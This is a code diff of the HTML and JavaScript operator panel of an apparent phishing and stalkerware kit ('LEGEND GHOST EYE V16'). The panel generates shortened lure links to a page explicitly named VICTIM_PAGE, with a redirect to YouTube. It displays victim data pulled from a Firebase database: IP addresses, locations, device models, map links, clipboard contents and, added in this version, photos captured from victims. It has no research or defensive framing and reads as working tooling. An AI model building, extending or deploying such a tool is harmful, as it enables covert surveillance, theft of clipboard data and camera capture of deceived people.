@@ -3,48 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEGEND HQ V15 | SUPREME</title>
+    <title>LEGEND V16 | GHOST EYE</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-        body { background: #f4f7f9; font-family: 'Poppins', sans-serif; margin: 0; padding: 15px; }
+        body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; padding: 10px; }
         .container { max-width: 500px; margin: auto; }
-        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); margin-bottom: 15px; }
-        h1 { color: #00a884; font-size: 1.2rem; text-align: center; margin-top: 0; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; outline: none; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
-        .stat-box { background: #00a884; color: white; padding: 10px; border-radius: 15px; text-align: center; font-size: 0.8rem; }
-        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 10px; border-left: 5px solid #00a884; font-size: 0.8rem; position: relative; }
-        .flag-img { width: 25px; vertical-align: middle; margin-left: 5px; border-radius: 3px; }
-        pre { background: #f8f9fa; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; font-size: 0.75rem; border: 1px solid #eee; }
+        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 10px; }
+        h1 { color: #cc0000; font-size: 1rem; text-align: center; margin: 0 0 15px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 5px; }
+        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 10px; border-left: 5px solid #cc0000; font-size: 0.8rem; }
+        .snap-img { width: 100%; border-radius: 10px; margin-top: 10px; border: 1px solid #ddd; }
+        .badge { background: #f8f9fa; padding: 3px 7px; border-radius: 5px; display: inline-block; margin: 2px; border: 1px solid #eee; }
         .social-links { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; margin-top: 20px; }
-        .social-links a { text-decoration: none; color: white; font-size: 0.65rem; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold; }
+        .social-links a { text-decoration: none; color: white; font-size: 0.6rem; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <h1>LEGEND SUPREME V15</h1>
-            
-            <div class="stats-grid">
-                <div class="stat-box">TRACKS: <span id="trackCount">0</span></div>
-                <div class="stat-box">CLIPS: <span id="clipCount">0</span></div>
-            </div>
-
+            <h1>LEGEND GHOST EYE V16</h1>
             <input type="text" id="masterKey" placeholder="Secret Key">
-            <input type="text" id="targetUrl" placeholder="Target Redirect URL">
-            <select id="mode">
-                <option value="yt">YouTube Mode</option>
-                <option value="wa">WhatsApp Mode</option>
-                <option value="drive">Google Drive Mode</option>
-            </select>
-            <button class="btn" onclick="generateLink()">GENERATE SUPREME LINK</button>
-            <div id="linkRes" style="font-size: 0.7rem; color: #00a884; margin-top: 10px; word-break: break-all; text-align: center;"></div>
+            <input type="text" id="targetUrl" placeholder="Redirect URL (YouTube)">
+            <button class="btn" onclick="generateLink()">GET SHORT LINK</button>
+            <p id="resLink" style="font-size: 0.7rem; word-break: break-all; color: #00a884; margin-top: 5px; text-align: center;"></p>
         </div>
 
-        <div style="display: flex; gap: 8px;">
-            <button class="btn" style="background:#333" onclick="fetchLogs('tracking')">LOGS</button>
-            <button class="btn" style="background:#333" onclick="fetchLogs('clipboard')">CLIPS</button>
+        <div style="display: flex; gap: 5px;">
+            <button class="btn" style="background:#333;" onclick="fetchLogs('tracking')">LOGS</button>
+            <button class="btn" style="background:#cc0000;" onclick="fetchLogs('photos')">SNAPS</button>
+            <button class="btn" style="background:#333;" onclick="fetchLogs('clipboard')">CLIPS</button>
         </div>
 
         <div id="displayArea"></div>
@@ -60,16 +48,16 @@
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
         const VICTIM_PAGE = "https://video-obtg.vercel.app/";
 
-        function generateLink() {
+        async function generateLink() {
             const k = document.getElementById('masterKey').value;
             const r = document.getElementById('targetUrl').value;
-            const m = document.getElementById('mode').value;
-            if(!k || !r) return alert("Fill all!");
-            
-            const longUrl = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r, m}))}`;
-            fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`)
-                .then(res => res.text())
-                .then(short => { document.getElementById('linkRes').innerHTML = `<b>Link:</b> ${short}`; });
+            if(!k || !r) return alert("Empty!");
+            const longLink = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r}))}`;
+            try {
+                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
+                const short = await res.text();
+                document.getElementById('resLink').innerText = short;
+            } catch(e) { document.getElementById('resLink').innerText = longLink; }
         }
 
         async function fetchLogs(path) {
@@ -78,25 +66,16 @@
             const data = await res.json();
             const area = document.getElementById('displayArea');
             area.innerHTML = "";
-            if(!data) return;
+            if(!data) return area.innerHTML = "<p style='text-align:center;'>No data found.</p>";
 
-            const keys = Object.keys(data);
-            if(path === 'tracking') document.getElementById('trackCount').innerText = keys.length;
-            else document.getElementById('clipCount').innerText = keys.length;
-
-            keys.reverse().forEach(id => {
+            Object.keys(data).reverse().forEach(id => {
                 const item = data[id];
-                if(path === 'tracking') {
-                    area.innerHTML += `
-                    <div class="log-card">
-                        <b>🕒 ${item.time}</b><br>
-                        🌐 IP: ${item.ip} <img src="${item.flag}" class="flag-img"><br>
-                        📍 ${item.loc}<br>
-                        📱 ${item.model} | 🧠 ${item.ram}GB<br>
-                        <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:bold; text-decoration:none;">[ OPEN MAP ]</a>
-                    </div>`;
+                if(path === 'photos') {
+                    area.innerHTML += `<div class="log-card" style="text-align:center;"><b>🕒 ${item.time}</b><img src="${item.photo}" class="snap-img"></div>`;
+                } else if(path === 'tracking') {
+                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><br><span class="badge">🌐 IP: ${item.ip}</span> <img src="${item.flag}" width="20"><br><span class="badge">📍 ${item.loc}</span><br><span class="badge">📱 ${item.model}</span><br><a href="${item.map}" target="_blank" style="color:red; font-weight:bold;">[ OPEN MAP ]</a></div>`;
                 } else {
-                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><pre>${item.clipData}</pre></div>`;
+                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><pre style="background:#f8f9fa; padding:10px; border-radius:10px; white-space:pre-wrap;">${item.clipData}</pre></div>`;
                 }
             });
         }
